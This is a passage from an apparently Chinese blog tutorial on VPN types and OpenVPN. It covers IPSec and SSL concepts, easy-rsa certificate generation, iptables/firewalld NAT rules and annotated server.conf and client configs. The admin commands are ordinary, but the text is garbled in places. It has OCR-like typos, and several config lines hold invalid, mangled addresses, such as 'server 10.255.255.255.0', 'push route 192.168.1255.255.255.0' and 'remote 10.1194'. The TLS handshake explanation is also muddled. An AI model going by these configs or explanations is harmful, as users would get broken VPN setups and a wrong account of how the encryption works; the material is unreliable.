ESP加密数据等文件。\nIPSec隧道模式隧道是封装、路由与解封装的整个过程。隧道将原始数据包隐藏(或封装)在新的数据包内部。该新的数据包可能会有新的寻址与路由信息，从而使其能够通过网络传输。隧道与数据保密性结合使用时，在网络上窃听通讯的人将无法获取原始数据包数据(以及原始的源和目标)。封装的数据包到达目的地后，会删除封装，原始数据包头用于将数据包路由到最终目的地。\n隧道本身是封装数据经过的逻辑数据路径，对原始的源和目的端，隧道是不可见的，而只能看到网络路径中的点对点连接。连接双方并不关心隧道起点和终点之间的任何路由器、交换机、代理服务器或其他安全网关。将隧道和数据保密性结合使用时，可用于提供VPN。\n封装的数据包在网络中的隧道内部传输。在此示例中，该网络是Internet。网关可以是外部Internet与专用网络间的周界网关。周界网关可以是路由器、防火墙、代理服务器或其他安全网关。另外，在专用网络内部可使用两个网关来保护网络中不信任的通讯。，\n当以隧道模式使用IPSec时，其只为IP通讯提供封装。使用IPSec隧道模式主要是为了与其他不支持IPSec上的L2TP或PPTP VPN隧道技术的路由器、网关或终端系统之间的相互操作。\nSSL VPN SSL VPN，SSL协议提供了数据私密性、端点验证、信息完整性等特性。SSL协议由许多子协议组成，其中两个主要子协议是握手协议和记录协议。握手协议允许服务器和客户端在应用协议传输第一个数据字节以前，彼此确认，协商一种加密算法和密码钥匙。在数据传输期间，记录协议利用握手协议生成的密钥加密和解密后来交换的数据。\nSSL独立于应用，因此任何一个应用程序都可以享受它的安全性而不必理会执行细节。SSL置身于网络结构体系的传输层和应用层之间。此外，SSL本身就被几乎所有的Web浏览器支持。这意味着客户端不需要为了支持SSL连接安装额外的软件。这两个特征就是SSL能应用于VPN的关键点。\n典型的SSL VPN应用如OpenVPN，是一个比较好的开源软件。9penVPN允许参与建立VPN的单点使用预设的私组，第三方证书，或者用户名/密码来进行身份验证。它大量使用了OpenSSL加密库，以及SSLv3/TLSv1协议。OpenVPN能在Linux, xBSD, Mac OSX与Windows上运行。它并不是一个基于Web的VPN软件，也不与IPsec及其他VPN软件包兼容（唯一不如PPTP VPN的缺点）。OpenVPN是基于C/S架构的软件，需要单独安装OpenVPN客户端（不如PPTP VPN之处）。\n图：VPN信息处理过程\rSource：https://juejin.cn/post/7061094724047732767\n实现vpn功能的常见开源产品 PPTP VPN 使用PPTP VPN的最大优势在于，无需在windows客户端单独安装VPN客户端软件，windows默认就支持PPTP VPN拨号连接功能。另外，PPTP VPN属于点对点方式的应用，比较适合远程的企业用户拨号到企业进行办公等的应用，很多小区及网络设备不支持PPTP导致无法访问。\nSSL VPN（OpenVPN） PPTP主要为那些经常外出移动或家庭办公的用户考虑，而OpenVPN不但使用于PPTP的应用场景，还适合针对企业异地两地总分公司之间的VPN不间断按需连接，例如：ERP，OA，及时通讯工具等在企业中的应用。缺点：需要单独安装客户端软件。\n典型的开源软件：OpenVPN\nIPSEC VPN IPSEC VPN也适合针对企业异地两地总分公司或多个IDC机房之间的VPN不间断按需连接，并且在部署使用上更简单方便。\n典型的开源软件：openswan\n根据企业生产场景需求选择vpn方案建议 如果领导愿意花钱，可以选择相关硬件产品，不错的成熟的很多，例如：防火墙、负载均衡等硬件产品都附带VPN功能。 对于多数互联网公司，为了体现我们运维构顶的价值，我们应该建议老板选择开源产品，优势就是省钱，可扩展性更强，例如:二次开发，相应功能的改动。 对于开源的产品，建议: 个人拨号选择 OpenVPN，功能强大、稳定可靠。 如果不希望单独安装客户端拨号，则可选择PPTP。尽量打消使用PPTP VPN的想法。 多个企业之间或者多个IDC机房直接互联，选择 IPSecVPN （openswan）或 OpenVPN。 OpenVPN开源产品介绍 在众多VPN的产品中，OpenVPN无疑是Linux下开源VPN的先锋，它提供了良好的访问性能和友好的用户GUI。\nOpenVPN是一个用于创建虚拟专用网络加密通道的软件包，最早由James Yonan编写。OpenVPN允许参与建立VPN的单点使用预设的私钥，第三方证书，或者用户名/密码来进行身份验证.它大量使用了OpenSSL加密库，以及SSLv3/TLSv1协议。OpenVPN能在Linux、xBSD、MacOS X与Windows上运行。OpenVPN是一个服务器和客户端软件，而不是一个基于Web的VPN软件，也不与IPsec及其他VPN软件包兼容。\nOpenVPN依赖的SSL与TLS协议介绍 SSL即，安全套接层(Secure Sockets Layer, SSL)是一种安全协议，诞生的目的是为网络通信提供安全及数据完整性保障，SSL在传输层中对网络通信进行加密。\nSSL采用公开密钥技术，保证两个应用间通信的保密性和可靠性，使客户与服务器应用之间的通信不被攻击者窃听。它在服务器和客户机两端可同时被支持，目前已成为互联网上保密通讯的工业标准。现行的Web浏览器亦普遍将HTTP和SSL相结合，从而实现安全通信。SSL协议其继任者是TLS。\n后来 IETF 将SSL作了标准化，即RFC2246，并将其称为TLS (Transport Layer Security)，其最新版本是RFC 5246，版本1.2。从技术上讲，TLS1.0与SSL3.0的差异非常微小。\nTLS(Transport Layer Security)\nTLS利用密钥算法在互联网上提供端点身份认证与通讯保密，其基础是公组基础设施(public key infrastructure, PKI)。不过在实现的典型例子中，只有网络服务者被可靠身份验证，而其客户端则不一定。这是因为公钥基础设施普遍商业运营，电子签名证书通常需要付费购买。协议的设计在某种程度上能够使主从架构应用程序通讯本身预防窃听、干扰(Tampering)和消息伪造。\nOpenVPN的加密通信原理过程 OpenVPN使用TLS加密是通过使用公开密钥（非对称密钥，加密解密使用不同的key，一个称为Public key，另一个是Private key）对数据进行加密的，对于TLS传输的工作原理，这里暂且先不介绍。对于OpenVPN使用TLS mode，首先Server和Client要有相同CA签发的证书，双方通过交换证书验证双方的合法性以决定是否建立VPN连接，然后使用对方CA把自己目前使用的数据加密方法(类似于密钥)加密后发送给对方，由于使用对方CA加密的，所以只有对方CA对应的Private key才能解密该字串，保证了此密钥的安全性，并且此密钥定期改变，对于窃听者来说，可能还没有破解出密钥，通信双方己经更换密钥了。\nOpenVPN的多种身份验证方式 OpenVPN提供了多种身份验证方式，用以确认参与连接双方的身份，包括：预享私钥，第三方证书以及用户名/密码组合等。预享私钥最为简单，但同时它只能用于建立点对点的VPN；基于PKI的第三方证书提供了最完善的功能，但是需要额外的精力去维护一个PKI证书体系。OpenVPN 2.0后引入了用户名/口令组合的身份验证方式，它可以省略客户端预享密钥，但是仍有一份服务器CA证书需要被用作加密，比较好的验证方式还有LDAP或域控制器统一验证等。\nOpenVPN通信原理 OpenVPN所有的通信都基于一个单一的IP端口(默认为1194)，默认使用UDP协议通讯，同时TCP（推荐）也被支持。OpenVPN连接能通过大多数的代理服务器，并且能够在NAT的环境中很好地工作。OpenVPN服务端具有向客户端“推送”某些网络配置信息的功能，这些信息包括：IP地址、路由设置等。OpenVPN提供了两种虚拟网络接口:通用Tun/Tap驱动，通过它们，可以建立三层IP隧道，或者虚拟二层以太网，后者可以传送任何类型的二层以太网络数据。传送的数据可通过LZO算法压缩。OenVPN2.0以后版本每个进程可以同时管理数个并发的隧道。\nOpenVPN使用通用网络协议(TCP与UDP)的特点使它成为IPsec等协议的理想替代，尤其是在ISP (Internet service provider)过滤某些特定VPN协议的情况下。\n在选择协议时候，需要注意2个加密隧道之间的网络状况，如有高延迟或者丢包较多的情况下，请选择TCP协议作为底层协议，UDP协议由于存在无连接和重传机制，导致要隧道上层的协议进行重传，效率非常低下。这里建议用TCP协议方式。\n参考：\nhttp://www.baike.com/wiki/OpenVPN\nhttp://zh.wikipedia.org/zh-cn/OpenVPN\nOpenVPN的技术核心是虚拟网卡，其次是SSL协议实现，SSL协议前面已阐述过，这里重点对虚拟网卡及其在OpenVPN的中的工作机理进行介绍。\n虚拟网卡是使用网络底层编程技术实现的一个驱动软件，安装后在主机上多出一个网卡，可以像其它网卡一样进行配置。服务程序可以在应用层打开虚拟网卡，如果应用软件(如IE)向虚拟网卡发送数据，则服务程序可以读取到该数据，如果服务程序写合适的数据到虚拟网卡，应用软件也可以接收得到。虚拟网卡在很多的操作系统下都有相应的实现，这也是OpenVPN能够跨平台一个很重要的理由。\n在OpenVPN中，如果用户访问一个远程的虚拟地址(属于虚拟网卡配用的地址系列，区别于真实地址)则操作系统会通过路由机制将数据包(TUN模式)或数据帧(TAP模式)发送到虚拟网卡上，服务程序接收该数据并进行相应的处理后，通过SOCKET从外网给虚拟网卡，则应用软件可以接收到，完成了一个单向传输的过程，反之亦然。\nOpenVPN使用OpenSSL库加密数据与控制信息：它使用了OpesSSL的加密以及验证功能意味着，它能够使用任何OpenSSL支持的算法。它提供了可选的数据包HMAC功能以提高连接的安全性。此外，OpenSSL的硬件加速也能提高它的性能。\nOpenVPN驱动部分实现了网卡处理和字符设备。网卡处理网络数据，字符设备完成与应用层的数据交互。 使用OpenVPN必须修改路由表 工作过程，发送数据：\n应用程序发送网络数据。 网络数据根据修改后的路由表把数据路由到虚拟网卡。 虚拟网卡把数据放到数据队列中。 字符设备从数据队列中取数据，然后送给应用层。 应用层把数据转发给物理网卡。 物理网卡发送数据。 接收过程：\n物理网卡接受到数据，并传到应用空间。 应用守护程序通过字符设备，把数据传给驱动网卡。 数据通过虚拟网卡重新进入网络堆栈。 网络堆栈把数据传给上层真实的应用程序。 OpenVPN生产环境常用场景 远程拨号访问企业网络或IDC机房 即通过个人电脑远程拨号到企业办公网络。一般为企业内部员工出差、休假或特殊情况下在远离办公室的时候，又有需求访问公司的内部网络获取相关资源，就可以通过VPN拨号到公司内部。此时远程拨号的员工和办公室内的员工4及其他拨号的员工之间都相当于一个局域网络内。例如：访问内部的域控制器，文件服务器，OA系统，HTTP服务，内网飞秋聊天工具等局域网服务应用。\n对于运维人就是需要个人电脑远程拨号到企业网站IDC机房，远程维护服务器。此点是技术人员特别是运维人员在工作中会经常用这个方法维护大量的机房内无外网IP的服务器及网络设备。\nclient-LAN类型数据库\n企业异地内部网络通过VPN连接成局域网 在公司的分支机构的局域网和公司总部LAN之间的VPN连接。通过公网Internet建立VPN将公司在各地的分支机构的LAN连接到公司总部的LAN。例如:各大超市之间业务结算等。\n这是由于地域的原因而产生的VPN的需求，通过VPN让不同地域内的机器可以互相访问，就好像是一个局域网一样。例如：办公室互联协同办公，机房互联数据同步及业务访问等。\nLAN-LAN类型示意图\n互联网公司多IDC机房之间通过VPN连接交换数据 此处是j臼维架构人员需要考虑的问题。不同机房之间业务管理和业务访问，数据流动。\n企业外部VPN服务 在供应商、合作伙伴的LAN和本公司的LAN之间建立的VPN服务。从技术上讲2，3，4的实现是一样的。\n路由方式和NAT方式企业实际应用区别和异同小结。\nNAT方式适合subnet machine 的网关不是VPNSERVER的场景。\nstatic routing适用于每个subnet machine都要配置对应的路由路由\n在企业应用场景中，多数情况下，内部服务器的网关不是VPNSERVER。此时NAT更简便，路由方式更复杂。\n企业中OpenVPN服务维护的常见问题\n如何增加多个vpn client证书文件\n方法1：为每一个客户建立一个证书。 OpenVPN 客户端单多个证书的撤销。\n如果某个同事离职，那么需要取消其VPN的拨入权限，可以通过在服务器端吊销该客户端证书来实现。官方给出的3个吊销证书的可能情况：revoking-certificates ","permalink":"https://www.oomkill.com/2019/11/ch1-introduction/","summary":"","title":"ch1 VPN与OpenVPN应用场景分析"},{"content":"OpenVPN安装环境需求 设备 IP 笔记本或PC\n(adsl上网) 10.0.0.0/24 办公室（DHCP） OpenVPN Server双网卡 eth0:10.0.0.4/24（外网）\neth1:192.168.100.4（内网） IDC机房内部局域网服务器 192.168.100.0/24\nIDC机房内网服务器无外网IP，又希望ADSL上网笔记本（运维人员），在不同的网络能够直接访问 实现需求：在远端通过VPN客户端(笔记本)拨号到VPN，然后在笔记本电脑上可以直接访问vpnserver所在局域网内的多个servers，进行维护管理 环境 VPN-Server eth0:10.0.0.4(外网IP)。GW:10.0.0.1, dns:10.0.0.1。\neth1:172.0.0.1(内网IP)。GW:不配\n提示：检查是否可以ping通client eth0 IP。\nApp client Server:ethO:172.0.0.2。GW:路由器。提示：检查是否可以ping通VPN-Server eth1 IP。 OpenVPN 解决方案图解\r部署OpenVPN Server Reference download lzo\ninstalling-openvpn\nopenvpn offical releases\nopenvpn github\n安装前准备\nopenvpn支持的平台：\nLinux kernel 2.6+ OpenBSD 5.1+ Mac OS X Darwin 10.5+ FreeBSD 7.4+ Windows (WinXP and higher) 下载地址：\nopenvpn-releases openvpn github 安装openvpn的依赖项：\n0.9.8版或更高版本的OpenSSL库，对于加密是必需的 PolarSSL库，是加密的替代版本1.1或更高版本 LZO实时压缩库，连接压缩所需 yum install openssl-devel lzo-devel pam-devel -y\r./configure \\\r--sbindir=/usr/sbin/\r--sysconfdir=/etc/openvpn/\r--libdir=/usr/lib/\r--includedir=/usr/include/\r--docdir=/usr/doc\r使用rpmbuild安装：openvpn.spec\n配置OpenVPN Server openvpn的配配置文件在下面目录中\nsample/sample-config-files/client.conf\nsample/sample-config-files/server.conf\ncp sample-config-files/server.conf /etc/openvpn/\r建立CA证书 easy-rsa是一个基于OpenSSL命令行工具的小型RSA密钥管理包。虽然它主要关注SSL VPN应用程序空间的密钥管理，但它也可用于构建Web证书。它最初被包含在OpenVPN中，但现在是一个单独的项目。\nopenvpn在2.3-alpha1 -\u0026gt; 2.3-alpha2版本迭代是将easy-rsa分割为单独的子项目。在2.3版本之前easy-rsa包含在openvpn内，在openvpn-2.2.2/easy-rsa/2.0目录下。\n证书也可以使用openssl进行生成，easy-rsa可以简化证书生成流程。\n设置并签署第一个请求 ./easyrsa help [commond] 查看帮助\n./easyrsa init-pki 初始化公钥基础设施，（初始化单独的PKI目录）\n./easyrsa build-ca nopass 创建ca\n./easyrsa gen-req {name} nopass 创建CSR，{name}只是一个名字，不代表任何。\n./easyrsa import-req pki/{name}.req 将请求文件.req，导入CA\n./easyrsa sign-req {server|client} {name} 签署请求\n./easyrsa revoke {name} 吊销证书\n./easyrsa gen-dh 生成Diffie-Hellman\nReference\neasyrsa readme\nEasyRSA的配置源 在easyrsa生成证书时，需要提供证书的配置，来设置证书对应的详情。此时就需要easyrsa获取外部的配置来替换证书默认的参数。\neasyrsa有四种方式获得外部配置\n命令行选项\n环境变量 ：覆盖全局选项\nenv-vars列表，任何设置/覆盖它的（CLI）以及可能的简洁描述如下所示：\nEASYRSA easyrsa脚本所在的Easy-RSA顶级目录。 EASYRSA_PKI 保存PKI的文件的目录，默认为$PWD/pki。 EASYRSA_DN：设置为字符串cn_only或org更改要包含在请求DN中的字段 EASYRSA_REQ_COUNTRY：DN国家 EASYRSA_REQ_PROVINCE：DN状态/省 EASYRSA_REQ_CITY：DN城市/位置 EASYRSA_REQ_ORG：DN组织 EASYRSA_REQ_EMAIL：DN电子邮件 EASYRSA_REQ_OU：DN组织单位 EASYRSA_KEY_SIZE：设置密钥大小单位 EASYRSA_ALGO：设置要使用的加密算法：rsa或ec EASYRSA_CA_EXPIRE：设置CA到期时间 EASYRSA_CERT_EXPIRE：设置已颁发证书的到期时间：单位天 EASYRSA_REQ_CN：默认CN，批量配置时可设置。 vars 文件：无扩展名的vars文件是为Easy-RSA提供配置的文件，该文件优先级低于环境变量与命令行参数。easyrsa对vars文件的检测顺序为：\n--vars 参数引用的文件 环境变量值EASYRSA_VARS_FILE 环境变量设置的pki目录 EASYRSA_PKI 执行默认目录 $PWD/pki 内部默认值\n生成服务端证书和密钥KEY文件\n与上一步类似，其中“Common Name”项需要填写VPN服务器的FQDN，其他均可默认为default值。还会出现：“Sign the certificate? [y/n]”和“1 out of 1 certificate requests certified, commit? [y/n]”。都输入y然后回车，其它可参照如下。\n### 准备生成证书用的CSR相关配置\rexport EASYRSA_REQ_COUNTRY=\u0026quot;HK\u0026quot;\rexport EASYRSA_REQ_PROVINCE=\u0026quot;HK\u0026quot;\rexport EASYRSA_REQ_CITY=\u0026quot;HongKong\u0026quot;\rexport EASYRSA_REQ_ORG=\u0026quot;china mobile\u0026quot;\rexport EASYRSA_REQ_EMAIL=\u0026quot;10086.chinamobile.cn\u0026quot;\r#证书有效期\rexport EASYRSA_CA_EXPIRE=3650\rexport EASYRSA_CERT_EXPIRE=3650\r# 默认cn\rexport EASYRSA_REQ_CN=\u0026quot;csol\u0026quot;\r# 批处理模式\rexport EASYRSA_BATCH=\u0026quot;enable\u0026quot;\r## 初始化pki\r./easyrsa init-pki\r## 创建CA\r./easyrsa build-ca nopass\r## 申请csr\r./easyrsa gen-req csol nopass\r## 导入csr\r./easyrsa import-req ./pki/reqs/csol.req csol\r## 签发证书\r./easyrsa sign-req server csol\r注意：easyrsa在执行是也是通过openssl进行，需要openssl-easyrsa.cnf 与 x509-types\nReference\n证书认证\nopenvpn配置文件说明\neasyrsa签发证书\n加强OpenVPN安全性 TLS-auth 参数增加所有 SSL/TLS 握手了额外的HMAC签名的完整性验证。任何没有正确HMAC签名的UDP数据包都被丢弃，而无需进一步处理。TLS-AUTH 可以防止：\nOpenVPN UDP端口上的DDoS攻击或Flood DDoS 。 端口扫描以确定哪些UDP端口处于侦听状态。 SSL/TLS缓冲区溢出漏洞。 切断来自未经授权的机器的SSL/TLS握手。 生成随机共享密钥（仅适用于非TLS静态密钥加密模式）\nopenvpn --genkey secret ta.key\r在服务器配置中，添加：\ntls-auth ta.key 0\r在客户端配置中，添加：\ntls-auth ta.key 1\rReference\nopenvpn-security\n调试OpenVPN服务端 取消服务器上防火墙iptables对Openvpn(默认1194)的拦截。以及允许服务进行转发。\ncentos7+ firewalld\nfirewall-cmd --add-port=1194/udp --permanent\rfirewall-cmd --permanent --direct --passthrough ipv4 -t nat -A POSTROUTING -s 192.168.100.0/24 -o eth1 -j MASQUERADE\riptables\niptables -A INPUT -i eth0 -m state --state NEW -p udp --dport 1194 -j ACCEPT\riptables -t nat -A POSTROUTING -o eth1 -s 192.168.100.0/24 -j MASQUERADE\r开启内核转发功能：\nsysctl net.ipv4.ip_forward |grep 1 \u0026gt; /dev/null \u0026amp;\u0026amp; \\\recho net.ipv4.ip_forward=1 \u0026gt;\u0026gt; /etc/sysctl.conf 启动OpenVPN server\nopenvpn --config server.conf\r默认情况下，openvpn客户端不能访问客户端上具相同子网的IP的主机。\n服务端 server.conf参数详解 openvpn默认配置文件在 sample/sample-config-files/server.conf 目录下。\n#####################################################\r# 多客户端服务器的OpenVPN 2.0配置文件示例\t#\r# #\r# 本文件用于多客户端\u0026lt;-\u0026gt;单服务器端的 #\r# OpenVPN服务器端配置 #\r# #\r# OpenVPN也支持单机\u0026lt;-\u0026gt;单机的配置 #\r# (在网站上的示例页面更多信息) #\r# #\r# 这个配置可以在Windows或Linux/BSD系统上工作\t#\r# Windows的路径名需要加双引号并使用双反斜杠 如\t#\r# \u0026quot;C:\\\\Program Files\\\\OpenVPN\\\\config\\\\foo.key\u0026quot;\t#\r# #\r# 前面加'#'或';'的是注释 #\r#####################################################\r# OpenVPN应该监听哪个本地IP地址（可选）\r# 如果不设置，默认监听所有IP\r;local a.b.c.d\r# OpenVPN应该监听哪个端口(TCP/UDP)\r# 如果想在同一台计算机上运行多个OpenVPN实例，可以使用不同的端口号来区分它们\r# 在防火墙上打开这个端口\rport 1194\r# 服务器使用TCP还是UDP协议\r;proto tcp\rproto udp\r# 指定OpenVPN创建的通信隧道类型\r# \u0026quot;dev tun\u0026quot;将会创建一个路由IP隧道\r# \u0026quot;dev tap\u0026quot;将会创建一个以太网隧道\r# 如果是以太网桥接模式，并且提前创建了一个名为\u0026quot;tap0\u0026quot;的与以太网接口进行桥接的虚拟接口，则你可以使用\u0026quot;dev tap0\u0026quot;\r# 如果想控制VPN的访问策略，必须为TUN/TAP接口创建防火墙规则\r# 在非Windows系统中，可以给出明确的单位编号，如\u0026quot;tun0\u0026quot;\r# 在Windows中，也可以使用\u0026quot;dev-node\u0026quot;\r# 在大多数系统上，除非部分或完全禁用了TUN/TAP接口的防火墙，否则VPN将不起作用。\r;dev tap\rdev tun\r# 如果想配置多个隧道，需要用到网络连接面板中TAP-Win32适配器的名称(如\u0026quot;MyTap\u0026quot;)\r# 在XP SP2或更高版本的系统中，可能需要有选择地禁用掉针对TAP适配器的防火墙\r# 通常情况下，非Windows系统则不需要该指令。\r;dev-node MyTap\r# 设置SSL/TLS根证书(ca)、证书(cert)和私钥(key)。\r# 每个客户端和服务器端都需要它们各自的证书和私钥文件。\r# 服务器端和所有的客户端都将使用相同的CA证书文件。\r#\r# 通过easy-rsa目录下的一系列脚本可以生成所需的证书和私钥。\r# 服务器端和每个客户端的证书必须使用唯一的Common Name。\r#\r# 也可以使用遵循X509标准的任何密钥管理系统来生成证书和私钥。\r# OpenVPN也支持使用一个PKCS #12格式的密钥文件(详情查看站点手册页面的\u0026quot;pkcs12\u0026quot;指令)\rca ca.crt\rcert server.crt\rkey server.key # 该文件应该保密\r# 迪菲·赫尔曼参数\r# 使用如下命令生成：\r# openssl dhparam -out dh2048.pem 2048\rdh dh2048.pem\r# 网络拓扑结构\r# 应该为子网(通过IP寻址)\r# 除非必须支持Windows客户端v2.0.9及更低版本(net30即每个客户端/30)\r# 默认为\u0026quot;net30\u0026quot;(不建议)\r;topology subnet\r# 设置服务器端模式，并提供一个VPN子网，以从中为客户端分配IP地址\r# 本例中服务器端自身占用10.8.0.1，其他的将分配给客户端使用\r# 每个客户端将能够通过10.8.0.1访问服务器\r# 如果使用的是以太网桥接模式，注释掉本行。更多信息请查看官方手册页面。\rserver 10.255.255.255.0\r# 在此文件中维护客户端与虚拟IP地址之间的关联记录\r# 如果OpenVPN重启，重新连接的客户端可以被分配到先前分配的虚拟IP地址\rifconfig-pool-persist ipp.txt\r# 该指令仅针对以太网桥接模式\r# 首先，必须使用操作系统的桥接能力将以太网网卡接口和TAP接口进行桥接\r# 然后，需要手动设置桥接接口的IP地址、子网掩码，这里假设为10.8.0.4和255.255.255.0\r# 最后，必须指定子网的一个IP范围(例如从10.8.0.50开始，到10.8.0.100结束)，以便于分配给连接的客户端\r# 如果不是以太网桥接模式，直接注释掉这行指令即可\r;server-bridge 10.255.255.2510.8.0.50 10.8.0.100\r# 该指令仅针对使用DHCP代理的以太网桥接模式\r# 此时客户端将请求服务器端的DHCP服务器，从而获得分配给它的IP地址和DNS服务器地址\r# 在此之前，也需要先将以太网网卡接口和TAP接口进行桥接\r# 注意：该指令仅用于OpenVPN客户端(如Windows)，并且该客户端的TAP适配器需要绑定到一个DHCP客户端上\r;server-bridge\r# 推送路由信息到客户端，以允许客户端能够连接到服务器后的其他私有子网\r# 即允许客户端访问VPN服务器可访问的其他局域网\r# 记住，这些私有子网还需要将OpenVPN客户端地址池（10.8.0.0/255.255.255.0）路由回到OpenVPN服务器\r;push \u0026quot;route 192.168.1255.255.255.0\u0026quot;\r;push \u0026quot;route 192.168.2255.255.255.0\u0026quot;\r# 要为指定的客户端分配特定的IP地址，或者客户端后的私有子网也要访问VPN\r# 可以针对该客户端的配置文件使用ccd子目录\r# 请参阅手册页获取更多信息\r# 示例1：假设有个Common Name为\u0026quot;Thelonious\u0026quot;的客户端后有一个小型子网也要连接到VPN\r# 该子网为192.168.40.128/255.255.255.248\r# 首先，去掉下面两行指令的注释：\r;client-config-dir ccd\r;route 192.168.40.128 255.255.255.248\r# 然后创建一个文件ccd/Thelonious，该文件的内容为(没有\u0026quot;#\u0026quot;)：\r# iroute 192.168.40.128 255.255.255.248\r# 客户端所在的子网就可以访问VPN了\r# 注意，这个指令只能在基于路由模式而不是基于桥接模式下才能生效\r# 比如，你使用了\u0026quot;dev tun\u0026quot;和\u0026quot;server\u0026quot;指令\r# 示例1：假设要给Thelonious分配一个固定的IP地址10.9.0.1\r# 首先，去掉下面两行指令的注释：\r;client-config-dir ccd\r;route 10.255.255.255.252\r# 然后在文件ccd/Thelonious中添加如下指令(没有\u0026quot;#\u0026quot;)：\r# ifconfig-push 10.10.9.0.2\r# 如果想要为不同群组的客户端启用不同的防火墙访问策略，你可以使用如下两种方法：\r# (1)运行多个OpenVPN守护进程，每个进程对应一个群组，并为每个进程(群组)启用适当的防火墙规则\r# (2)(进阶)创建一个脚本来动态地修改响应于来自不同客户的防火墙规则\r# 关于learn-address脚本的更多信息请参考官方手册页面\r;learn-address ./script\r# 如果启用该行指令，所有客户端的默认网关都将重定向到VPN\r# 这将导致诸如web浏览器、DNS查询等所有客户端流量都经过VPN\r# (为确保能正常工作，OpenVPN服务器所在计算机可能需要在TUN/TAP接口与以太网之间使用NAT或桥接技术进行连接)\r;push \u0026quot;redirect-gateway def1 bypass-dhcp\u0026quot;\r# 某些具体的Windows网络设置可以被推送到客户端，例如DNS或WINS服务器地址\r# 下列地址来自opendns.com提供的Public DNS服务器\r;push \u0026quot;dhcp-option DNS 208.67.222.222\u0026quot;\r;push \u0026quot;dhcp-option DNS 208.67.220.220\u0026quot;\r# 去掉该行指令的注释将允许不同的客户端之间互相访问\r# 默认情况，客户端只能访问服务器\r# 为了确保客户端只能看见服务器，还可以在服务器端的TUN/TAP接口上设置适当的防火墙规则\r;client-to-client\r# 如果多个客户端可能使用相同的证书/私钥文件或Common Name进行连接，那么可以取消该指令的注释\r# 建议该指令仅用于测试目的。对于生产环境使用而言，每个客户端都应该拥有自己的证书和私钥\r# 如果没有为每个客户端分别生成Common Name唯一的证书/私钥，可以取消该行的注释(不推荐这样做)\r;duplicate-cn\r# keepalive指令将导致类似于ping命令的消息被来回发送，以便于服务器端和客户端知道对方何时被关闭\r# 每10秒钟ping一次，如果120秒内都没有收到对方的回复，则表示远程连接已经关闭\rkeepalive 10 120\r# 出于SSL/TLS之外更多的安全考虑，创建一个\u0026quot;HMAC 防火墙\u0026quot;可以帮助抵御DoS攻击和UDP端口淹没攻击\r# 可以使用以下命令来生成：\r# openvpn --genkey --secret ta.key\r#\r# 服务器和每个客户端都需要拥有该密钥的一个拷贝\r# 第二个参数在服务器端应该为'0'，在客户端应该为'1'\rtls-auth ta.key 0 # 该文件应该保密\r# 选择一个密码加密算法，该配置项也必须复制到每个客户端配置文件中\r# 注意，v2.4客户端/服务器将自动以TLS模式协商AES-256-GCM，请参阅手册中的ncp-cipher选项\rcipher AES-256-CBC\r# 在VPN链接上启用压缩并将选项推送到客户端（仅适用于v+，对于早期版本，请参阅下文）\r;compress lz4-v2\r;push \u0026quot;compress lz4-v2\u0026quot;\r# 对于与旧客户端兼容的压缩，使用comp-lzo\r# 如果在此启用，还必须在客户端配置文件中启用它\r;comp-lzo\r# 允许并发连接的客户端的最大数量\r;max-clients 100\r# 初始化后减少OpenVPN守护进程的权限是一个好主意\r# 该指令仅限于非Windows系统中使用\r;user nobody\r;group nobody\r# 持久化选项可以尽量避免访问那些在重启之后由于用户权限降低而无法访问的某些资源\rpersist-key\rpersist-tun\r# 输出一个简短的状态文件，用于显示当前的连接状态，该文件每分钟都会清空并重写一次\rstatus openvpn-status.log\r# 默认情况下，日志消息将写入syslog(在Windows系统中，如果以服务方式运行，日志消息将写入OpenVPN安装目录的log文件夹中)\r# 可以使用log或者log-append来改变这种默认设置\r# \u0026quot;log\u0026quot;方式在每次启动时都会清空之前的日志文件\r# \u0026quot;log-append\u0026quot;是在之前的日志内容后进行追加\r# 你可以使用两种方式之一(不要同时使用)\r;log openvpn.log\r;log-append openvpn.log\r# 为日志文件设置适当的冗余级别(0~9)\r# 冗余级别越高，输出的信息越详细\r#\r# 0 表示静默运行，只记录致命错误\r# 4 表示合理的常规用法\r# 5和6 可以帮助调试连接错误\r# 9 表示极度冗余，输出非常详细的日志信息\rverb 3\r# 忽略过多的重复信息\r# 相同类别的信息只有前20条会输出到日志文件中\r;mute 20\r# 通知客户端，当服务器重新启动时，可以自动重新连接\r# 只能是UDP协议使用，TCP使用的话不能启动服务\rexplicit-exit-notify 1\r# （如果不添加该指令则）默认值3600，也就是一个小时进行一次TSL重新协商\r# 这个参数在服务端和客户端设置都有效\r# 如果两边都设置了，就按照时间短的设定优先\r# 当两边同时设置成0，表示禁用TSL重协商。使用OTP认证需要禁用\rreneg-sec 0\r可用的服务端配置\nlocal 10.0.0.4\rport 1194\rproto udp\rdev tun\rca ca.crt\rcert server.crt\rkey server.key\rdh dh2048.pem\r# 分配给客户端的地址池，与dhcp类似\rserver 192.168.10255.255.255.0\rifconfig-pool-persist ipp.txt\rpush \u0026quot;route 192.168.10255.255.255.0\u0026quot;\rclient-to-client\rduplicate-cn\rkeepalive 10 120\rcomp-lzo\rmax-clients 100\rpersist-key\rpersist-tun\rlog-append /var/log/openvpn.log\rverb 3\rmute 20\rexplicit-exit-notify 1\rreneg-sec 360\rtls-auth ta.key 0\r相关证书文件说明 文件名 需要使用者 目的 默认是否加密 ca.crt server + all clients Root CA certificate NO ca.key key signing machine only Root CA key YES dh{n}.pem server only Diffie Hellman parameters NO server.crt server only Server Certificate NO server.key server only Server Key YES client1.crt client1 only Client1 Certificate NO client1.key client1 only Client1 Key YES reference explanation of the relevant files\nOpenVPN客户端配置使用 下载并安装openvpn客户端 在windows上需要下载与Server版本一致的带有GUI的Windows端。下载地址：community\n配置并下载客户端证书 生成客户端证书和key文件\n生成client证书和key文件。若建立多个客户证书，则重复如下步骤即可.只需修改Common Name项oldboy的名称。\n在OpenVPN中，这种配置方法是每一个登陆的VPN客户端需要有一个证书，每个证书在同一时刻只能供一个客户端连接（如果有两个机器安装相同证书，同时拨服务器，都能拨上，但是只有第一个拨上的才能连通网络）。所以，如果有多个人，每个人需要建立一份证书。\n将ca.crt、redis.crt、redis.key复制到OpenVPN\\config。（不同用户使用不同的证书，每个证书包括.crt和.key两个文件。如test.crt和test.key)\n在 sample-config-files/client.conf的基础上建立客户端配置文件，改名为client.oven，即先在服务器上建立配置文件，然后再下载改名到客户机上。\nclient\rdev tun\rproto udp\rremote 10.1194\rnobind\rresolv-retry infinite\rpersist-key\rpersist-tun\rmute-replay-warnings\rcipher AES-256-CBC\rcomp-lzo\rverb 3\rca ca.crt\rcert test.crt\rkey test.key\rtls-auth ta.key 1\r客户端远程连接OpenVPN服务 当配置文件的扩展名为.ovpn，配置文件存放至客户端配置的目录中。ca、证书 